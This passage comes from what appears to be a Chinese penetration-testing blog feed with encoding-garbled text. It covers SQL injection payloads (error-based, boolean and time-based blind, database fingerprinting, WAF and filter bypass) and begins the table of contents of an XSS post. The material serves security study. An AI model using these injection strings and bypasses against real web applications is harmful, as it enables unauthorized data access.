class="hljs-number">1</span>,database(),version(),<span class="hljs-number">4</span>,<span class="hljs-number">5</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="2-2-2-2-group-byé‡å¤å»ºå†²çªæŠ¥é”™"><a href="#2-2-2-2-group-byé‡å¤å»ºå†²çªæŠ¥é”™" class="headerlink" title="2.2.2.2 group byé‡å¤å»ºå†²çªæŠ¥é”™"></a>2.2.2.2 group byé‡å¤å»ºå†²çªæŠ¥é”™</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> (<br>    <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<br>        <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<br>            (<br>                <span class="hljs-keyword">select</span> database() <span class="hljs-keyword">from</span> information_schema.tables limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>  <span class="hljs-comment">--+ çœŸæ­£çš„æŸ¥è¯¢è¯­å¥</span><br>            ),<span class="hljs-built_in">floor</span>(rand()<span class="hljs-operator">*</span><span class="hljs-number">2</span>)<br>        )x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br>    )a<br>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="2-2-2-3-xpathè¯­æ³•é”™è¯¯"><a href="#2-2-2-3-xpathè¯­æ³•é”™è¯¯" class="headerlink" title="2.2.2.3 xpathè¯­æ³•é”™è¯¯"></a>2.2.2.3 xpathè¯­æ³•é”™è¯¯</h4><p>xpath è¯­æ³•æŠ¥é”™æ³¨å…¥ï¼Œä¸»è¦åˆ©ç”¨extractvalue()å’Œupdatexml()å‡½æ•°ã€‚  </p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(<br>    <span class="hljs-keyword">select</span> database()  <span class="hljs-comment">--+ çœŸæ­£çš„æŸ¥è¯¢è¯­å¥</span><br>    ),<span class="hljs-string">&#x27;^&#x27;</span>)) <span class="hljs-comment">--+</span><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(<br>    <span class="hljs-keyword">select</span> database()  <span class="hljs-comment">--+ çœŸæ­£çš„æŸ¥è¯¢è¯­å¥</span><br>    ),<span class="hljs-string">&#x27;^&#x27;</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="2-2-3-ç›²æ³¨"><a href="#2-2-3-ç›²æ³¨" class="headerlink" title="2.2.3 ç›²æ³¨"></a>2.2.3 ç›²æ³¨</h3><h4 id="2-2-3-1-å¸ƒå°”ç›²æ³¨"><a href="#2-2-3-1-å¸ƒå°”ç›²æ³¨" class="headerlink" title="2.2.3.1 å¸ƒå°”ç›²æ³¨"></a>2.2.3.1 å¸ƒå°”ç›²æ³¨</h4><h5 id="åˆ¤æ–­æ•°æ®åº“åé•¿åº¦"><a href="#åˆ¤æ–­æ•°æ®åº“åé•¿åº¦" class="headerlink" title="åˆ¤æ–­æ•°æ®åº“åé•¿åº¦"></a>åˆ¤æ–­æ•°æ®åº“åé•¿åº¦</h5><p>æ”¹å˜length(database())&#x3D;çš„æ•°å€¼ï¼Œå½“æ¡ä»¶ä¸ºçœŸæ—¶ï¼Œé¡µé¢å°±ä¼šæ­£å¸¸æ˜¾ç¤º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h5 id="åˆ¤æ–­æ•°æ®åº“å"><a href="#åˆ¤æ–­æ•°æ®åº“å" class="headerlink" title="åˆ¤æ–­æ•°æ®åº“å"></a>åˆ¤æ–­æ•°æ®åº“å</h5><p>ä½¿ç”¨ sbustr å‡½æ•°ä¸€ä½ä¸€ä½æˆªå–æ•°æ®åº“åï¼Œå¦‚æœä¸ºçœŸï¼Œåˆ™é¡µé¢æ­£å¸¸æ˜¾ç¤º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">and</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="2-2-3-2-æ—¶é—´ç›²æ³¨"><a href="#2-2-3-2-æ—¶é—´ç›²æ³¨" class="headerlink" title="2.2.3.2 æ—¶é—´ç›²æ³¨"></a>2.2.3.2 æ—¶é—´ç›²æ³¨</h4><p>å½“é¡µé¢æ²¡æœ‰å¸ƒå°”çŠ¶æ€æ—¶ï¼Œå¯ä»¥é€šè¿‡è§‚å¯Ÿé¡µé¢å“åº”æ—¶é—´æ˜¯å¦å˜é•¿æ¥åˆ¤æ–­è¾“å…¥çš„æ¡ä»¶æ˜¯å¦æ­£ç¡®ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-comment">-- +&#x27; LIMIT 0,1;</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> if((length(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>),sleep(<span class="hljs-number">10</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> if((substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span>),sleep(<span class="hljs-number">10</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h1 id="3-æ•°æ®åº“åˆ¤æ–­"><a href="#3-æ•°æ®åº“åˆ¤æ–­" class="headerlink" title="3 æ•°æ®åº“åˆ¤æ–­"></a>3 æ•°æ®åº“åˆ¤æ–­</h1><h2 id="3-1-å¸¸è§å‰ç«¯ä¸æ•°æ®åº“ç±»å‹åŒ¹é…"><a href="#3-1-å¸¸è§å‰ç«¯ä¸æ•°æ®åº“ç±»å‹åŒ¹é…" class="headerlink" title="3.1 å¸¸è§å‰ç«¯ä¸æ•°æ®åº“ç±»å‹åŒ¹é…"></a>3.1 å¸¸è§å‰ç«¯ä¸æ•°æ®åº“ç±»å‹åŒ¹é…</h2><table><thead><tr><th>å‰ç«¯è¯­è¨€</th><th>æ•°æ®åº“</th></tr></thead><tbody><tr><td>sap</td><td>sql serverï¼ŒAccess</td></tr><tr><td>.net</td><td>sql server</td></tr><tr><td>php</td><td>PostgreSQL, Mysql</td></tr><tr><td>java</td><td>mysql, oracle</td></tr></tbody></table><h2 id="3-2-æ•°æ®åº“æ ‡å¿—æ€§ä¿¡æ¯"><a href="#3-2-æ•°æ®åº“æ ‡å¿—æ€§ä¿¡æ¯" class="headerlink" title="3.2 æ•°æ®åº“æ ‡å¿—æ€§ä¿¡æ¯"></a>3.2 æ•°æ®åº“æ ‡å¿—æ€§ä¿¡æ¯</h2><table><thead><tr><th>æ•°æ®åº“</th><th>ä¿¡æ¯æŸ¥è¯¢</th></tr></thead><tbody><tr><td>oracle</td><td>select@@version â€“</td></tr><tr><td>sql server</td><td>select banner from v$version</td></tr><tr><td>mysql</td><td>select @@version, version() â€“, lenth(user)&gt;0</td></tr><tr><td>postgreSQL</td><td>select version() â€“</td></tr></tbody></table><h2 id="3-3-å­—ç¬¦ä¸²å¤„ç†æ–¹å¼"><a href="#3-3-å­—ç¬¦ä¸²å¤„ç†æ–¹å¼" class="headerlink" title="3.3 å­—ç¬¦ä¸²å¤„ç†æ–¹å¼"></a>3.3 å­—ç¬¦ä¸²å¤„ç†æ–¹å¼</h2><table><thead><tr><th>æ•°æ®åº“</th><th>å¤„ç†æ–¹å¼</th></tr></thead><tbody><tr><td>sql server</td><td>id&#x3D;1 and â€˜aâ€™+â€™bâ€™&#x3D;â€™abâ€™ â€“</td></tr><tr><td>mssql</td><td>id&#x3D;1 and â€˜aâ€™+â€™bâ€™&#x3D;â€™abâ€™</td></tr><tr><td>mysql</td><td>id&#x3D;1 and â€˜aâ€™+â€™bâ€™&#x3D;â€™abâ€™, â€˜abâ€™&#x3D;concat(â€˜aâ€™,â€™bâ€™)</td></tr><tr><td>oracle</td><td>id&#x3D;1 and â€˜aâ€™+â€™bâ€™&#x3D;â€™aâ€™||â€™bâ€™, â€˜abâ€™&#x3D;concat(â€˜aâ€™,â€™bâ€™)</td></tr><tr><td>postgresql</td><td>id&#x3D;1 and â€˜aâ€™+â€™bâ€™&#x3D;â€™aâ€™||â€™bâ€™, â€˜abâ€™&#x3D;concat(â€˜aâ€™,â€™bâ€™)</td></tr></tbody></table><h2 id="3-4-ç‰¹æ®Šç¬¦å·ä¸æ³¨é‡Š"><a href="#3-4-ç‰¹æ®Šç¬¦å·ä¸æ³¨é‡Š" class="headerlink" title="3.4 ç‰¹æ®Šç¬¦å·ä¸æ³¨é‡Š"></a>3.4 ç‰¹æ®Šç¬¦å·ä¸æ³¨é‡Š</h2><ol><li>null å’Œ %00 æ˜¯Accessæ”¯æŒçš„æ³¨é‡Šã€‚</li><li># æ˜¯MySQLä¸­çš„æ³¨é‡Šç¬¦ï¼Œè¿”å›é”™è¯¯è¯´æ˜è¯¥æ³¨å…¥ç‚¹å¯èƒ½ä¸æ˜¯MySQLï¼Œå¦å¤–ä¹Ÿæ”¯æŒâ€™â€“ â€˜,å’Œ&#x2F;* *&#x2F;æ³¨é‡Šï¼ˆæ³¨æ„mysqlä½¿ç”¨â€“ æ—¶éœ€è¦åé¢æ·»åŠ ç©ºæ ¼ï¼‰</li><li>â€“ å’Œ &#x2F;* *&#x2F; æ˜¯Oracleï¼ŒSQL serverå’ŒMSSQLæ”¯æŒçš„æ³¨é‡Šç¬¦ï¼Œå¦‚æœæ­£å¸¸ï¼Œè¯´æ˜å¯èƒ½å°±æ˜¯è¿™ä»¨äº†ã€‚</li><li>; æ˜¯å­å¥æŸ¥è¯¢æ ‡è¯†ç¬¦ï¼Œåœ¨Oracleä¸­ä¸æ”¯æŒå¤šè¡ŒæŸ¥è¯¢ï¼Œè¿”å›é”™è¯¯ï¼Œå¾ˆå¯èƒ½æ˜¯Oracleæ•°æ®åº“ã€‚</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and exists (select count(*) from sysobjects) &gt;0 æ­£å¸¸ï¼Œå°±æ˜¯MSSQLæ•°æ®åº“</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> msysobjects) <span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> ä¸¤æ¡éƒ½ä¸æ­£å¸¸ï¼Œæ˜¯Accessæ•°æ®åº“<br></code></pre></td></tr></table></figure><h1 id="4-ç»•è¿‡"><a href="#4-ç»•è¿‡" class="headerlink" title="4 ç»•è¿‡"></a>4 ç»•è¿‡</h1><h2 id="4-1-å…³é”®å­—è¿‡æ»¤"><a href="#4-1-å…³é”®å­—è¿‡æ»¤" class="headerlink" title="4.1 å…³é”®å­—è¿‡æ»¤"></a>4.1 å…³é”®å­—è¿‡æ»¤</h2><ul><li>ç¬¬ä¸€ç§æ˜¯æ›¿æ¢å…³é”®å­—ï¼Œè¿™ç§æ–¹å¼å¯ä»¥ç›´æ¥é€šè¿‡åŒå†™å…³é”®è¯ç­‰æ–¹å¼æ¥è¿›è¡Œç»•è¿‡ï¼›</li><li>ç¬¬äºŒç§æ˜¯å…³é”®è¯ç›´æ¥æ‹¦æˆªï¼Œè¿™ç§æƒ…å†µä¸‹å¯ä»¥é€šè¿‡å˜æ¢å‡½æ•°ç­‰æ–¹å¼æ¥è¿›è¡Œç»•è¿‡ã€‚</li></ul><h2 id="4-2-ç©ºæ ¼è¿‡æ»¤"><a href="#4-2-ç©ºæ ¼è¿‡æ»¤" class="headerlink" title="4.2 ç©ºæ ¼è¿‡æ»¤"></a>4.2 ç©ºæ ¼è¿‡æ»¤</h2><ul><li>ä½¿ç”¨&#x2F;**&#x2F;å³SQLè¯­å¥ä¸­çš„æ³¨é‡Šè¯­å¥æ¥ç»•è¿‡ã€‚</li><li>ä½¿ç”¨åŒå†™URLç¼–ç ç»•è¿‡ï¼Œä¾‹å¦‚(%20 â†’ %2%200)ã€‚</li><li>é€šè¿‡ç‰¹æ®Šç¬¦å·ï¼ˆåå¼•å·ã€åŠ å·ã€æ‹¬å·ç­‰ç­‰ï¼‰ï¼Œç»•è¿‡ç©ºæ ¼ã€‚ï¼ˆåœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚ï¼‰</li><li>é€šè¿‡ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼šwhere id&#x3D;0e1union select 1,2</li><li>Fuzzæ‰€æœ‰å­—ç¬¦ï¼ŒæŸ¥æ‰¾å¯æ›¿ä»£ç©ºæ ¼çš„å­—ç¬¦ä¾‹å¦‚ %09 %0a %0b %0c %0dã€‚</li></ul><table><thead><tr><th>URLç¼–ç </th><th>ç¬¦å·</th></tr></thead><tbody><tr><td>%09</td><td>TAB é”®ï¼ˆæ°´å¹³ï¼‰</td></tr><tr><td>%0a</td><td>æ–°å»ºä¸€è¡Œ</td></tr><tr><td>%0c</td><td>æ–°çš„ä¸€é¡µ</td></tr><tr><td>%0d</td><td>return åŠŸèƒ½</td></tr><tr><td>%0b</td><td>TAB é”®ï¼ˆå‚ç›´ï¼‰</td></tr><tr><td>%a0</td><td>ç©ºæ ¼</td></tr></tbody></table><table><thead><tr><th>æ•°æ®åº“</th><th>ç©ºç™½å­—ç¬¦</th></tr></thead><tbody><tr><td>SQLite3</td><td>0A 0D 0C 09 20</td></tr><tr><td>MYSQL5</td><td>09 0A 0B 0C 0D A0 20</td></tr><tr><td>PosgresSQL</td><td>0A 0D 0C 09 20</td></tr><tr><td>Oracle 11g</td><td>00 0A 0D 0C 09 20</td></tr><tr><td>MSSQL</td><td>01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20</td></tr></tbody></table><h2 id="4-3-é€—å·è¿‡æ»¤-x2F-æ‹¦æˆª"><a href="#4-3-é€—å·è¿‡æ»¤-x2F-æ‹¦æˆª" class="headerlink" title="4.3 é€—å·è¿‡æ»¤&#x2F;æ‹¦æˆª"></a>4.3 é€—å·è¿‡æ»¤&#x2F;æ‹¦æˆª</h2><p>æ‹¦æˆªé€—å·åï¼Œæ„å‘³ç€å¤§éƒ¨åˆ†çš„è”åˆæŸ¥è¯¢æ³¨å…¥éƒ½å¤±æ•ˆï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥å°è¯•è¿›è¡Œç›²æ³¨ã€‚</p><p>substringå’Œifè¯­å¥éƒ½ç”¨åˆ°äº†é€—å·ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨ã€‚</p><p>substringå¯ä»¥ç”¨substr()å‡½æ•°æ¥è¿›è¡Œä»£æ›¿ï¼Œifè¯­å¥å¯ä»¥é€šè¿‡andè¯­å¥æ¥è¿›è¡Œä»£æ›¿ã€‚</p><h2 id="4-4-å•å¼•å·æ‹¦æˆª-x2F-è¿‡æ»¤-x2F-è½¬ä¹‰"><a href="#4-4-å•å¼•å·æ‹¦æˆª-x2F-è¿‡æ»¤-x2F-è½¬ä¹‰" class="headerlink" title="4.4 å•å¼•å·æ‹¦æˆª&#x2F;è¿‡æ»¤&#x2F;è½¬ä¹‰"></a>4.4 å•å¼•å·æ‹¦æˆª&#x2F;è¿‡æ»¤&#x2F;è½¬ä¹‰</h2><p>å½“å¼•å·å­˜åœ¨è¿‡æ»¤å’Œè½¬ä¹‰çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è¿™æ ·å¤„ç†ï¼š</p><h3 id="4-4-1-åˆ©ç”¨ç¼–ç ç‰¹æ€§ç»•è¿‡ã€‚ï¼ˆå®½å­—èŠ‚æ³¨å…¥ï¼‰"><a href="#4-4-1-åˆ©ç”¨ç¼–ç ç‰¹æ€§ç»•è¿‡ã€‚ï¼ˆå®½å­—èŠ‚æ³¨å…¥ï¼‰" class="headerlink" title="4.4.1 åˆ©ç”¨ç¼–ç ç‰¹æ€§ç»•è¿‡ã€‚ï¼ˆå®½å­—èŠ‚æ³¨å…¥ï¼‰"></a>4.4.1 åˆ©ç”¨ç¼–ç ç‰¹æ€§ç»•è¿‡ã€‚ï¼ˆå®½å­—èŠ‚æ³¨å…¥ï¼‰</h3><p>æ¯”è¾ƒå…¸å‹çš„ä½¿ç”¨ç¼–ç å°±æ˜¯GBKç¼–ç ï¼šä½¿ç”¨å‰é¢çš„å­—ç¬¦åƒæ‰åé¢çš„å­—ç¬¦(æ–œæ†)ã€‚</p><p>å¾…è¡¥å……</p><h3 id="4-4-2-åˆ©ç”¨åæ–œæ -ç»•è¿‡"><a href="#4-4-2-åˆ©ç”¨åæ–œæ -ç»•è¿‡" class="headerlink" title="4.4.2 åˆ©ç”¨åæ–œæ \ç»•è¿‡"></a>4.4.2 åˆ©ç”¨åæ–œæ \ç»•è¿‡</h3><p>å¾…è¡¥å……</p><h3 id="4-4-3-å°†-utf-8-è½¬æ¢ä¸º-utf-16-æˆ–-utf-32"><a href="#4-4-3-å°†-utf-8-è½¬æ¢ä¸º-utf-16-æˆ–-utf-32" class="headerlink" title="4.4.3 å°† utf-8 è½¬æ¢ä¸º utf-16 æˆ– utf-32"></a>4.4.3 å°† utf-8 è½¬æ¢ä¸º utf-16 æˆ– utf-32</h3><p>å¾…è¡¥å……</p><h2 id="4-5-æ•°å­—è¢«è¿‡æ»¤-x2F-æ‹¦æˆªç»•è¿‡"><a href="#4-5-æ•°å­—è¢«è¿‡æ»¤-x2F-æ‹¦æˆªç»•è¿‡" class="headerlink" title="4.5 æ•°å­—è¢«è¿‡æ»¤&#x2F;æ‹¦æˆªç»•è¿‡"></a>4.5 æ•°å­—è¢«è¿‡æ»¤&#x2F;æ‹¦æˆªç»•è¿‡</h2><p>æ•°å­—è¢«å±è”½æ—¶ï¼Œç”¨å“åº”å‡½æ•°ç»“æœæ¥æ„é€ ã€‚</p><ul><li>ceil() ï¼šä¸ºå‘ä¸Šå–æ•´å‡½æ•°</li><li>floor()ï¼šä¸ºå‘ä¸‹å–æ•´å‡½æ•°</li><li>! ~~ï¼šèµ·åˆ°å–åçš„æ•ˆæœ</li><li>pi() ï¼šÏ€å€¼</li><li>version()ï¼šåˆ©ç”¨å½“å‰ç‰ˆæœ¬å·è¿›è¡Œæ•°å­—çš„æ„é€ </li><li>falseï¼šå€¼ä¸º0</li><li>trueï¼šå€¼ä¸º1</li></ul><h2 id="4-6-ç­‰å·è¿‡æ»¤"><a href="#4-6-ç­‰å·è¿‡æ»¤" class="headerlink" title="4.6 ç­‰å·è¿‡æ»¤"></a>4.6 ç­‰å·è¿‡æ»¤</h2><ul><li>å½“ç­‰äºå·&#x3D;å‘—è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ï¼šlike,in ç­‰å­—ç¬¦æ›¿æ¢</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; IN (&#x27;</span><span class="hljs-number">1234</span><span class="hljs-string">&#x27;)#</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">like</span> <span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><h2 id="4-7-å…¶ä»–å…³é”®å­—è¿‡æ»¤-x2F-æ‹¦æˆªç»•è¿‡"><a href="#4-7-å…¶ä»–å…³é”®å­—è¿‡æ»¤-x2F-æ‹¦æˆªç»•è¿‡" class="headerlink" title="4.7 å…¶ä»–å…³é”®å­—è¿‡æ»¤&#x2F;æ‹¦æˆªç»•è¿‡"></a>4.7 å…¶ä»–å…³é”®å­—è¿‡æ»¤&#x2F;æ‹¦æˆªç»•è¿‡</h2><p>å…³é”®å­—è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥é€šè¿‡åŒå†™æˆ–å¤§å°å†™ã€å…¶ä»–ç¼–ç ä¾‹å¦‚åå…­è¿›åˆ¶ã€URLç¼–ç æ¥è¿›è¡Œç»•è¿‡ï¼š</p><table><thead><tr><th>å…³é”®å­—</th><th>åŒå†™</th><th>å¤§å°å†™</th><th>å…¶ä»–ç¼–ç </th><th>ç¬¦å·</th></tr></thead><tbody><tr><td>and</td><td>aandnd</td><td>and</td><td>an\x64</td><td>&amp;&amp;</td></tr><tr><td>select</td><td>selselectect</td><td>SelECt</td><td>selec\x74</td><td></td></tr><tr><td>or</td><td>oorr</td><td>oR</td><td>o\x72</td><td>||</td></tr><tr><td>union</td><td>uniunionon</td><td>uNioN</td><td>unio\x6e</td><td></td></tr></tbody></table><h1 id="å‚è€ƒå†…å®¹"><a href="#å‚è€ƒå†…å®¹" class="headerlink" title="å‚è€ƒå†…å®¹"></a>å‚è€ƒå†…å®¹</h1><p><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/sql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93/">sqlæ³¨å…¥æ€»ç»“</a></p><p><a href="https://files.cnblogs.com/files/lcamry/mysql-injection.pdf">æ³¨å…¥å¤©ä¹¦</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>PenTest</category>
      
      <category>ç»å…¸æ¼æ´</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>PenTest</tag>
      
      <tag>ç»å…¸æ¼æ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç»å…¸æ¼æ´-XSS</title>
    <link href="/2022/07/21/2022-07-21.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-XSS/"/>
    <url>/2022/07/21/2022-07-21.%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E-XSS/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-xss-%E6%A6%82%E8%BF%B0%E5%92%8C%E5%8E%9F%E7%90%86">1 XSS æ¦‚è¿°å’ŒåŸç†</a></li><li><a href="#11-xss-%E7%B1%BB%E5%9E%8B">1.1 XSS ç±»å‹</a></li><li><a href="#2-xss-%E8%BD%BD%E8%8D%B7%E4%B8%8E%E6%8F%92%E5%85%A5%E4%BD%8D%E7%BD%AE">2 XSS è½½è·ä¸æ’å…¥ä½ç½®</a><ul><li><a href="#21-%E8%BD%BD%E8%8D%B7">2.1 è½½è·</a><ul><li><a href="#211-script-%E6%A0%87%E7%AD%BE">2.1.1 script æ ‡ç­¾</a></li><li><a href="#212-svg-%E6%A0%87%E7%AD%BE">2.1.2 svg æ ‡ç­¾</a></li><li><a href="#213-img-%E6%A0%87%E7%AD%BE">2.1.3 img æ ‡ç­¾</a></li><li><a href="#214-body-%E6%A0%87%E7%AD%BE">2.1.4 body æ ‡ç­¾</a></li><li><a href="#215-video-%E6%A0%87%E7%AD%BE">2.1.5 video æ ‡ç­¾</a></li><li><a href="#216-style-%E6%A0%87%E7%AD%BE">2.1.6 style æ ‡ç­¾</a></li><li><a href="#217-details">2.1.7 details</a></li><li><a href="#218-select">2.1.8 select</a></li><li><a href="#219-iframe">2.1.9 iframe</a></li><li><a href="#2110-form">2.1.10 form</a></li><li><a href="#2111-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE">2.1.11 è‡ªå®šä¹‰æ ‡ç­¾</a></li></ul></li><li><a href="#22-xss-%E5%8F%AF%E4%BB%A5%E6%8F%92%E5%85%A5%E7%9A%84%E4%BD%8D%E7%BD%AE">2.2 XSS å¯ä»¥æ’å…¥çš„ä½ç½®</a><ul><li><a href="#221-%E6%B5%8B%E8%AF%95%E4%BD%8D%E7%BD%AE">2.2.1 æµ‹è¯•ä½ç½®</a></li></ul></li></ul></li><li><a href="#3-xss-%E7%BC%96%E7%A0%81%E4%B8%8E%E7%BB%95%E8%BF%87">3 XSS ç¼–ç ä¸ç»•è¿‡</a><ul><li><a href="#31-%E7%BD%91%E9%A1%B5%E7%9A%84%E8%A7%A3%E7%A0%81%E8%BF%87%E7%A8%8B">3.1 ç½‘é¡µçš„è§£ç è¿‡ç¨‹</a></li><li><a href="#32-%E7%BB%95%E8%BF%87">3.2 ç»•è¿‡</a><ul><li><a href="#321-%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4">3.2.1 å…³é”®å­—è¢«è¿‡æ»¤</a><ul><li><a href="#3211-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87">3.2.1.1 åŒå†™ç»•è¿‡</a></li><li><a href="#3212-%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5">3.2.1.2 å­—ç¬¦æ‹¼æ¥</a></li><li><a href="#3213-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87">3.2.1.3 ç¼–ç ç»•è¿‡</a></li><li><a href="#3214-%E5%86%85%E5%B5%8C%E7%BC%96%E7%A0%81%E5%90%8Etab">3.2.1.4 å†…åµŒç¼–ç åTAB</a></li><li><a href="#3215-%E5%A4%9A%E9%87%8D%E5%B0%96%E6%8B%AC%E5%8F%B7">3.2.1.5 å¤šé‡å°–æ‹¬å·</a></li><li><a href="#3216-%E5%B0%86js%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8D%E4%B8%BA%E5%9B%BE%E5%83%8F">3.2.1.6 å°†JSæ–‡ä»¶é‡å‘½åä¸ºå›¾åƒ</a></li></ul></li><li><a href="#322-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E5%BC%95%E5%8F%B7">3.2.2 è¿‡æ»¤ç©ºæ ¼&#x2F;å¼•å·</a><ul><li><a href="#3221-%E4%BD%BF%E7%94%A8%E4%BB%A3%E6%9B%BF">3.2.2.1 ä½¿ç”¨&#x2F;ä»£æ›¿</a></li></ul></li><li><a href="#323-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7">3.2.3 è¿‡æ»¤å•&#x2F;åŒå¼•å·</a></li><li><a href="#324-%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7">3.2.4 è¿‡æ»¤æ‹¬å·</a></li><li><a 